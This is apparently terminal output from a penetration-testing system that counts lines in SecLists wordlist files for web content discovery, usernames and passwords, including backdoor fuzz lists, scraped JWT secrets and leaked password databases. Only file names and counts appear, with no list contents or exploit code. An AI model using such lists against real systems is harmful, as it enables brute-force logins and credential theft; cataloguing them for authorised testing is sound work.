     2303 /usr/share/seclists/Discovery/Web-Content/dutch/new/34.txt
     2288 /usr/share/seclists/Discovery/Web-Content/dutch/new/29.txt
    40415 /usr/share/seclists/Discovery/Web-Content/dutch/new/28.txt
   370459 /usr/share/seclists/Discovery/Web-Content/dutch/new/unique_final.txt
    20103 /usr/share/seclists/Discovery/Web-Content/dutch/new/14.txt
    20104 /usr/share/seclists/Discovery/Web-Content/dutch/new/20.txt
    20590 /usr/share/seclists/Discovery/Web-Content/dutch/new/2.txt
    10442 /usr/share/seclists/Discovery/Web-Content/dutch/new/31.txt
     6640 /usr/share/seclists/Discovery/Web-Content/dutch/new/27.txt
    23396 /usr/share/seclists/Discovery/Web-Content/dutch/new/18.txt
    23487 /usr/share/seclists/Discovery/Web-Content/dutch/new/10.txt
     7265 /usr/share/seclists/Discovery/Web-Content/dutch/new/33.txt
     8085 /usr/share/seclists/Discovery/Web-Content/dutch/new/17.txt
     8088 /usr/share/seclists/Discovery/Web-Content/dutch/new/32.txt
     3571 /usr/share/seclists/Discovery/Web-Content/dutch/new/16.txt
     8458 /usr/share/seclists/Discovery/Web-Content/dutch/new/21.txt
    86286 /usr/share/seclists/Discovery/Web-Content/dutch/new/11.txt
    10406 /usr/share/seclists/Discovery/Web-Content/dutch/new/26.txt
    12025 /usr/share/seclists/Discovery/Web-Content/dutch/new/7.txt
      496 /usr/share/seclists/Discovery/Web-Content/dutch/new/5.txt
    76391 /usr/share/seclists/Discovery/Web-Content/dutch/new/23.txt
    68382 /usr/share/seclists/Discovery/Web-Content/dutch/new/25.txt
     8927 /usr/share/seclists/Discovery/Web-Content/dutch/new/8.txt
    27204 /usr/share/seclists/Discovery/Web-Content/dutch/new/1.txt
    18109 /usr/share/seclists/Discovery/Web-Content/dutch/new/12.txt
     1138 /usr/share/seclists/Discovery/Web-Content/dutch/new/24.txt
     2400 /usr/share/seclists/Discovery/Web-Content/dutch/new/6.txt
     4537 /usr/share/seclists/Discovery/Web-Content/dutch/new/22.txt
     2068 /usr/share/seclists/Discovery/Web-Content/dutch/new/4.txt
    17015 /usr/share/seclists/Discovery/Web-Content/dutch/new/13.txt
    11546 /usr/share/seclists/Discovery/Web-Content/dutch/new/3.txt
   370459 /usr/share/seclists/Discovery/Web-Content/dutch/new/with_underscore.txt
    15618 /usr/share/seclists/Discovery/Web-Content/dutch/new/9.txt
   102670 /usr/share/seclists/Discovery/Web-Content/dutch/new/15.txt
   696173 /usr/share/seclists/Discovery/Web-Content/dutch/new/total_final.txt
     9951 /usr/share/seclists/Discovery/Web-Content/dutch/github.txt
     3241 /usr/share/seclists/Discovery/Web-Content/dutch/list_2.txt
      474 /usr/share/seclists/Discovery/Web-Content/dutch/kabel.txt
     6264 /usr/share/seclists/Discovery/Web-Content/dutch/list_7.txt
        9 /usr/share/seclists/Discovery/Web-Content/Programming-Language-Specific/CommonBackdoors-PL.fuzz.txt
       23 /usr/share/seclists/Discovery/Web-Content/Programming-Language-Specific/ASP.NET/CommonBackdoors-ASP.fuzz.txt
        7 /usr/share/seclists/Discovery/Web-Content/Programming-Language-Specific/ASP.NET/ELMAH-Debugger.txt
      141 /usr/share/seclists/Discovery/Web-Content/Programming-Language-Specific/ror.txt
     5163 /usr/share/seclists/Discovery/Web-Content/Programming-Language-Specific/Common-PHP-Filenames.txt
      206 /usr/share/seclists/Discovery/Web-Content/Programming-Language-Specific/golang.txt
        9 /usr/share/seclists/Discovery/Web-Content/Programming-Language-Specific/CommonBackdoors-JSP.fuzz.txt
      120 /usr/share/seclists/Discovery/Web-Content/Programming-Language-Specific/Java-Spring-Boot.txt
      422 /usr/share/seclists/Discovery/Web-Content/Programming-Language-Specific/CommonBackdoors-PHP.fuzz.txt
      104 /usr/share/seclists/Discovery/Web-Content/Programming-Language-Specific/PHP.fuzz.txt
       39 /usr/share/seclists/Discovery/Web-Content/UnixDotfiles.fuzz.txt
      160 /usr/share/seclists/Discovery/Web-Content/OracleAppServer.fuzz.txt
       46 /usr/share/seclists/Discovery/Web-Content/web-mutations.txt
     1102 /usr/share/seclists/Discovery/Web-Content/BurpSuite-ParamMiner/uppercase-headers
     1102 /usr/share/seclists/Discovery/Web-Content/BurpSuite-ParamMiner/lowercase-headers
    38267 /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt
       89 /usr/share/seclists/Discovery/Web-Content/Logins.fuzz.txt
       60 /usr/share/seclists/Discovery/Web-Content/Oracle9i.fuzz.txt
    87664 /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
     4391 /usr/share/seclists/Discovery/Web-Content/common-and-dutch.txt
        1 /usr/share/seclists/Discovery/Web-Content/URLs/README.md
     1055 /usr/share/seclists/Discovery/Web-Content/URLs/urls-Drupal-7.20.txt
     4755 /usr/share/seclists/Discovery/Web-Content/URLs/urls-joomla-3.0.3.txt
      151 /usr/share/seclists/Discovery/Web-Content/URLs/urls-SAP.txt
      927 /usr/share/seclists/Discovery/Web-Content/URLs/urls-wordpress-3.3.1.txt
      102 /usr/share/seclists/Discovery/Web-Content/graphql.txt
       75 /usr/share/seclists/Discovery/Web-Content/wso2-enterprise-integrator.txt
      118 /usr/share/seclists/Discovery/Web-Content/versioning_metafiles.txt
     1097 /usr/share/seclists/Discovery/Web-Content/SAP-NetWeaver.txt
      592 /usr/share/seclists/Discovery/Web-Content/oauth-oidc-scopes.txt
     6453 /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
  1377725 /usr/share/seclists/Discovery/Web-Content/combined_directories.txt
    29999 /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
     2379 /usr/share/seclists/Discovery/Web-Content/Roundcube-123.txt
     4986 /usr/share/seclists/Discovery/Web-Content/common-and-spanish.txt
   207643 /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
     1290 /usr/share/seclists/Discovery/Web-Content/raft-medium-extensions.txt
    37050 /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt
       48 /usr/share/seclists/Discovery/Web-Content/ntlm-directories.txt
     2565 /usr/share/seclists/Discovery/Web-Content/quickhits.txt
     4940 /usr/share/seclists/Discovery/Web-Content/common-and-portuguese.txt
    62281 /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
    20115 /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt
        3 /usr/share/seclists/Discovery/Web-Content/Domino-Hunter/Commands-NSF.txt
      297 /usr/share/seclists/Discovery/Web-Content/Domino-Hunter/dh.pl
      116 /usr/share/seclists/Discovery/Web-Content/Domino-Hunter/Domino-Files.txt
        5 /usr/share/seclists/Discovery/Web-Content/Domino-Hunter/Commands-Views.txt
        3 /usr/share/seclists/Discovery/Web-Content/Domino-Hunter/Commands-Documents.txt
      340 /usr/share/seclists/Discovery/Web-Content/Domino-Hunter/LICENCE
      336 /usr/share/seclists/Discovery/Web-Content/Common-DB-Backups.txt
    43007 /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
     2073 /usr/share/seclists/Discovery/Web-Content/web-all-content-types.txt
    10848 /usr/share/seclists/Discovery/Web-Content/raft-small-files-lowercase.txt
       67 /usr/share/seclists/Discovery/Web-Content/hashicorp-vault.txt
    16244 /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt
  1273832 /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
    17129 /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
     3388 /usr/share/seclists/Discovery/Web-Content/LEGACY-SERVICES/CGIs/CGIs.txt
       74 /usr/share/seclists/Discovery/Web-Content/LEGACY-SERVICES/CGIs/CGI-Microsoft.fuzz.txt
        6 /usr/share/seclists/Discovery/Web-Content/LEGACY-SERVICES/CGIs/CGI-HTTP-POST-Windows.fuzz.txt
       29 /usr/share/seclists/Discovery/Web-Content/LEGACY-SERVICES/CGIs/README.md
        7 /usr/share/seclists/Discovery/Web-Content/LEGACY-SERVICES/CGIs/CGI-HTTP-POST.fuzz.txt
     3948 /usr/share/seclists/Discovery/Web-Content/LEGACY-SERVICES/CGIs/CGI-XPlatform.fuzz.txt
        4 /usr/share/seclists/Discovery/Web-Content/LEGACY-SERVICES/README.md
      211 /usr/share/seclists/Discovery/Web-Content/url-params_from-top-55-most-popular-apps.txt
       60 /usr/share/seclists/Discovery/Web-Content/netware.txt
       68 /usr/share/seclists/Discovery/Web-Content/domino-dirs-coldfusion39.txt
  1185254 /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
      174 /usr/share/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt
      963 /usr/share/seclists/Discovery/Web-Content/raft-small-extensions.txt
        6 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/cat/Conf/htaccess.txt
       70 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/cat/Conf/config.txt
       31 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/cat/Conf/properties.txt
       29 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/cat/Conf/conf.txt
        2 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/cat/Project/suo.txt
      112 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/cat/Project/pdb.txt
       38 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/cat/Project/csproj.txt
       12 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/cat/Project/sln.txt
       60 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/cat/Project/resx.txt
        1 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/cat/Project/vbproj.txt
        8 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/cat/Database/mdb.txt
     1334 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/cat/Database/xml.txt
      774 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/cat/Database/inc.txt
        3 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/cat/Database/mdf.txt
      174 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/cat/Database/ini.txt
      407 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/cat/Database/sql.txt
       25 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/cat/Language/cfm.txt
      619 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/cat/Language/asp.txt
       90 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/cat/Language/phpt.txt
       64 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/cat/Language/py.txt
       15 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/cat/Language/php3.txt
        9 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/cat/Language/wsdl.txt
      233 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/cat/Language/aspx.txt
     3550 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/cat/Language/js.txt
      372 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/cat/Language/java.txt
      125 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/cat/Language/swf.txt
       48 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/cat/Language/c.txt
       59 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/cat/Language/sh.txt
     1239 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/cat/Language/css.txt
      854 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/cat/Language/tpl.txt
     2417 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/cat/Language/cs.txt
       30 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/cat/Language/cpp.txt
       11 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/cat/Language/php5.txt
       40 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/cat/Language/vb.txt
      111 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/cat/Language/jar.txt
        1 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/cat/Language/jspf.txt
       80 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/cat/Language/ascx.txt
    20721 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/cat/Language/php.txt
       72 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/cat/Language/rb.txt
     3859 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/cat/Language/html.txt
      135 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/cat/Language/pl.txt
       18 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/cat/Language/jsp.txt
    25419 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/all-extensionless.txt
      496 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/symfony.txt
     5966 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/all-dirs.txt
      457 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/context/test.txt
      128 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/context/error.txt
      175 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/context/index.txt
       12 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/context/root.txt
      139 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/context/install.txt
      413 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/context/admin.txt
       42 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/context/debug.txt
      435 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/context/log.txt
       39 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/context/setup.txt
       28 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/context/readme.txt
      147 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/context/help.txt
    43135 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/all.txt
        6 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/ReadMe.txt
      674 /usr/share/seclists/Discovery/Web-Content/File-Extensions-Universal-SVNDigger-Project/Licence
      175 /usr/share/seclists/Discovery/Web-Content/vulnerability-scan_j2ee-websites_WEB-INF.txt
       56 /usr/share/seclists/Discovery/Web-Content/Service-Specific/Swagger.txt
      461 /usr/share/seclists/Discovery/Web-Content/Service-Specific/Microsoft-Forefront-Identity-Manager.txt
       19 /usr/share/seclists/Discovery/Web-Content/Service-Specific/README.md
       22 /usr/share/seclists/Discovery/Web-Content/Service-Specific/confluence-administration.txt
       40 /usr/share/seclists/Discovery/Web-Content/Service-Specific/Jenkins-Hudson.txt
      520 /usr/share/seclists/Discovery/Web-Content/Service-Specific/IBM-WebSphere-Application-Server.txt
      238 /usr/share/seclists/Discovery/Web-Content/Service-Specific/HP-System-Management-Homepage.txt
       25 /usr/share/seclists/Discovery/Web-Content/Service-Specific/Keycloak-Identity-Access-Management.txt
      371 /usr/share/seclists/Discovery/Web-Content/Service-Specific/Oracle-WebLogic.txt
      170 /usr/share/seclists/Discovery/Web-Content/Service-Specific/PulseSecure-VPN.txt
       43 /usr/share/seclists/Discovery/Web-Content/Microsoft-Frontpage.txt
       39 /usr/share/seclists/Discovery/Web-Content/hashicorp-consul-api.txt
    20478 /usr/share/seclists/Discovery/Web-Content/big.txt
     2367 /usr/share/seclists/Discovery/Web-Content/raft-large-extensions-lowercase.txt
       43 /usr/share/seclists/Discovery/Web-Content/web-extensions.txt
        3 /usr/share/seclists/Discovery/Web-Content/common_directories.txt
   141708 /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt
    27294 /usr/share/seclists/Discovery/Web-Content/trickest-robots-disallowed-wordlists/top-1000.txt
     3618 /usr/share/seclists/Discovery/Web-Content/trickest-robots-disallowed-wordlists/top-100.txt
   181611 /usr/share/seclists/Discovery/Web-Content/trickest-robots-disallowed-wordlists/top-10000.txt
      914 /usr/share/seclists/Discovery/Web-Content/raft-small-extensions-lowercase.txt
     1828 /usr/share/seclists/Discovery/Web-Content/dsstorewordlist.txt
     4906 /usr/share/seclists/Discovery/Web-Content/common-and-french.txt
     3132 /usr/share/seclists/Discovery/Web-Content/api/objects.txt
       24 /usr/share/seclists/Discovery/Web-Content/api/README.md
      224 /usr/share/seclists/Discovery/Web-Content/api/actions.txt
    12334 /usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt
     1285 /usr/share/seclists/Discovery/Web-Content/api/salesforce-aura-objects.txt
       96 /usr/share/seclists/Discovery/Web-Content/api/objects-uppercase.txt
      269 /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
      988 /usr/share/seclists/Discovery/Web-Content/api/ispsystem_billmanager_api.txt
       98 /usr/share/seclists/Discovery/Web-Content/api/objects-lowercase.txt
     7615 /usr/share/seclists/Discovery/Web-Content/api/api-seen-in-wild.txt
      112 /usr/share/seclists/Discovery/Web-Content/api/actions-uppercase.txt
      112 /usr/share/seclists/Discovery/Web-Content/api/actions-lowercase.txt
       31 /usr/share/seclists/Discovery/Web-Content/Proxy-Auto-Configuration-Files.txt
       82 /usr/share/seclists/Discovery/Variables/awesome-environment-variable-names.txt
       69 /usr/share/seclists/Discovery/Variables/secret-keywords.txt
      118 /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt
     3217 /usr/share/seclists/Discovery/SNMP/snmp.txt
      118 /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt
     3216 /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt
      197 /usr/share/seclists/Discovery/Mainframe/default_cics_transactions.txt
 31035327 total
```
```
└─$ find /usr/share/seclists/Usernames -type f -exec wc -l {} +
    1000 /usr/share/seclists/Usernames/Names/malenames-usa-top1000.txt
    1000 /usr/share/seclists/Usernames/Names/familynames-usa-top1000.txt
    1000 /usr/share/seclists/Usernames/Names/femalenames-usa-top1000.txt
   10177 /usr/share/seclists/Usernames/Names/names.txt
    1000 /usr/share/seclists/Usernames/Names/forenames-india-top1000.txt
  624370 /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt
     828 /usr/share/seclists/Usernames/cirt-default-usernames.txt
       1 /usr/share/seclists/Usernames/README.md
     113 /usr/share/seclists/Usernames/CommonAdminBase64.txt
      17 /usr/share/seclists/Usernames/top-usernames-shortlist.txt
   26324 /usr/share/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt
      23 /usr/share/seclists/Usernames/sap-default-usernames.txt
 8295455 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
      10 /usr/share/seclists/Usernames/mssql-usernames-nansh0u-guardicore.txt
```
```                                                                                                                                                                                                                                         
└─$ find /usr/share/seclists/Passwords -type f -exec wc -l {} + 
   103979 /usr/share/seclists/Passwords/scraped-JWT-secrets.txt
  5189454 /usr/share/seclists/Passwords/xato-net-10-million-passwords.txt
    47603 /usr/share/seclists/Passwords/Most-Popular-Letter-Passes.txt
        4 /usr/share/seclists/Passwords/stupid-ones-in-production.txt
      399 /usr/share/seclists/Passwords/twitter-banned.txt
   100000 /usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt
  3721224 /usr/share/seclists/Passwords/openwall.net-all.txt
    10000 /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt
     3106 /usr/share/seclists/Passwords/Software/john-the-ripper.txt
   306706 /usr/share/seclists/Passwords/Software/cain-and-abel.txt
     3629 /usr/share/seclists/Passwords/unkown-azul.txt
       17 /usr/share/seclists/Passwords/README.md
  1000000 /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
   226928 /usr/share/seclists/Passwords/Leaked-Databases/honeynet-withcount.txt
     8930 /usr/share/seclists/Passwords/Leaked-Databases/hotmail.txt
       92 /usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt
   184364 /usr/share/seclists/Passwords/Leaked-Databases/phpbb-cleaned-up.txt
    97718 /usr/share/seclists/Passwords/Leaked-Databases/fortinet-2021_clean-combos.txt
     6163 /usr/share/seclists/Passwords/Leaked-Databases/rockyou-45.txt
    87093 /usr/share/seclists/Passwords/Leaked-Databases/fortinet-2021_users.txt
    12570 /usr/share/seclists/Passwords/Leaked-Databases/bible.txt
   213627 /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
     2351 /usr/share/seclists/Passwords/Leaked-Databases/hak5-withcount.txt
     8348 /usr/share/seclists/Passwords/Leaked-Databases/faithwriters-withcount.txt
    37144 /usr/share/seclists/Passwords/Leaked-Databases/myspace-withcount.txt
  3132006 /usr/share/seclists/Passwords/Leaked-Databases/alleged-gmail-passwords.txt
     1476 /usr/share/seclists/Passwords/Leaked-Databases/izmy.txt
    42660 /usr/share/seclists/Passwords/Leaked-Databases/rockyou-70.txt
     3957 /usr/share/seclists/Passwords/Leaked-Databases/rockyou-40.txt
   434923 /usr/share/seclists/Passwords/Leaked-Databases/fortinet-2021.txt
    95072 /usr/share/seclists/Passwords/Leaked-Databases/muslimMatch.txt
    37126 /usr/share/seclists/Passwords/Leaked-Databases/myspace.txt
    38820 /usr/share/seclists/Passwords/Leaked-Databases/tuscl.txt
   226928 /usr/share/seclists/Passwords/Leaked-Databases/honeynet2.txt
   184389 /usr/share/seclists/Passwords/Leaked-Databases/phpbb-withcount.txt
     2506 /usr/share/seclists/Passwords/Leaked-Databases/rockyou-35.txt
       11 /usr/share/seclists/Passwords/Leaked-Databases/README.md
    12233 /usr/share/seclists/Passwords/Leaked-Databases/singles.org.txt
     1904 /usr/share/seclists/Passwords/Leaked-Databases/carders.cc.txt
  3431316 /usr/share/seclists/Passwords/Leaked-Databases/md5decryptor-uk.txt
      512 /usr/share/seclists/Passwords/Leaked-Databases/rockyou-20.txt
       13 /usr/share/seclists/Passwords/Leaked-Databases/rockyou-05.txt
      100 /usr/share/seclists/Passwords/Leaked-Databases/adobe100.txt
    21040 /usr/share/seclists/Passwords/Leaked-Databases/rockyou-60.txt
   212904 /usr/share/seclists/Passwords/Leaked-Databases/rockyou-withcount.txt.tar.gz
     4064 /usr/share/seclists/Passwords/Leaked-Databases/youporn2012.txt
    11781 /usr/share/seclists/Passwords/Leaked-Databases/Lizard-Squad.txt
     1556 /usr/share/seclists/Passwords/Leaked-Databases/rockyou-30.txt
     8089 /usr/share/seclists/Passwords/Leaked-Databases/porn-unknown-withcount.txt
    12234 /usr/share/seclists/Passwords/Leaked-Databases/singles.org-withcount.txt
    30289 /usr/share/seclists/Passwords/Leaked-Databases/rockyou-65.txt
    12864 /usr/share/seclists/Passwords/Leaked-Databases/bible-withcount.txt
    14235 /usr/share/seclists/Passwords/Leaked-Databases/rockyou-55.txt
     2351 /usr/share/seclists/Passwords/Leaked-Databases/hak5.txt
      895 /usr/share/seclists/Passwords/Leaked-Databases/elitehacker-withcount.txt
     8345 /usr/share/seclists/Passwords/Leaked-Databases/faithwriters.txt
    95073 /usr/share/seclists/Passwords/Leaked-Databases/muslimMatch-withcount.txt
    78977 /usr/share/seclists/Passwords/Leaked-Databases/fortinet-2021_passwords.txt
   226081 /usr/share/seclists/Passwords/Leaked-Databases/honeynet.txt
     8088 /usr/share/seclists/Passwords/Leaked-Databases/porn-unknown.txt
     1437 /usr/share/seclists/Passwords/Leaked-Databases/NordVPN.txt
   375853 /usr/share/seclists/Passwords/Leaked-Databases/Ashley-Madison.txt
      249 /usr/share/seclists/Passwords/Leaked-Databases/rockyou-15.txt
   184388 /usr/share/seclists/Passwords/Leaked-Databases/phpbb.txt
     4062 /usr/share/seclists/Passwords/Leaked-Databases/youporn2012-raw.txt
   720302 /usr/share/seclists/Passwords/Leaked-Databases/000webhost.txt
     9437 /usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt
    59186 /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt
      895 /usr/share/seclists/Passwords/Leaked-Databases/elitehacker.txt
      929 /usr/share/seclists/Passwords/Leaked-Databases/rockyou-25.txt
        1 /usr/share/seclists/Passwords/der-postillon.txt
   100007 /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt
      173 /usr/share/seclists/Passwords/Common-Credentials/medical-devices.txt
     1575 /usr/share/seclists/Passwords/Common-Credentials/probable-v2_top-1575.txt
       25 /usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt
       25 /usr/share/seclists/Passwords/Common-Credentials/SplashData-2015-2.txt
     1000 /usr/share/seclists/Passwords/Common-Credentials/Pwdb_top-1000.txt
   100000 /usr/share/seclists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt
       15 /usr/share/seclists/Passwords/Common-Credentials/best15.txt
      101 /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt
      199 /usr/share/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
       22 /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt
        4 /usr/share/seclists/Passwords/Common-Credentials/README.md
    45012 /usr/share/seclists/Passwords/Common-Credentials/1900-2020.txt
      207 /usr/share/seclists/Passwords/Common-Credentials/probable-v2_top-207.txt
      100 /usr/share/seclists/Passwords/Common-Credentials/worst-passwords-2017-top100-slashdata.txt
  1000000 /usr/share/seclists/Passwords/Common-Credentials/Pwdb_top-1000000.txt
    10000 /usr/share/seclists/Passwords/Common-Credentials/four-digit-pin-codes-sorted-by-frequency-withcount.csv
    10000 /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt
     1000 /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt
      197 /usr/share/seclists/Passwords/Common-Credentials/2020-200_most_used_passwords.txt
       25 /usr/share/seclists/Passwords/Common-Credentials/SplashData-2014.txt
     9999 /usr/share/seclists/Passwords/Common-Credentials/darkweb2017_top-10000.txt
      815 /usr/share/seclists/Passwords/Common-Credentials/common-passwords-win.txt
      196 /usr/share/seclists/Passwords/Common-Credentials/2024-197_most_used_passwords.txt
   100000 /usr/share/seclists/Passwords/Common-Credentials/Pwdb_top-100000.txt
    10000 /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
     1049 /usr/share/seclists/Passwords/Common-Credentials/best1050.txt
       25 /usr/share/seclists/Passwords/Common-Credentials/SplashData-2015-1.txt
   999998 /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
      499 /usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt
      110 /usr/share/seclists/Passwords/Common-Credentials/best110.txt
       99 /usr/share/seclists/Passwords/Common-Credentials/darkweb2017_top-100.txt
      999 /usr/share/seclists/Passwords/Common-Credentials/darkweb2017_top-1000.txt
      500 /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-500.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Hebrew_Pwdb_common-password-list-top-150.txt
  1000000 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Chinese-common-password-list-top-1000000.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Ukranian_Pwdb_common-password-list-top-150.txt
  4106545 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Chinese-common-password-list.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Cantonese_Pwdb_common-password-list-top-150.txt
    19994 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/French-common-password-list-top-20000.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Hindi_Pwdb_common-password-list-top-150.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Malay_Pwdb_common-password-list-top-150.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Lithuanian_Pwdb_common-password-list-top-150.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Norwegian_Pwdb_common-password-list-top-150.txt
       32 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/README.md
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Thai_Pwdb_common-password-list-top-150.txt
    10000 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Chinese-common-password-list-top-10000.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Mandarin_Pwdb_common-password-list-top-150.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/French_Pwdb_common-password-list-top-150.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Greek_Pwdb_common-password-list-top-150.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Finnish_Pwdb_common-password-list-top-150.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Swedish_Pwdb_common-password-list-top-150.txt
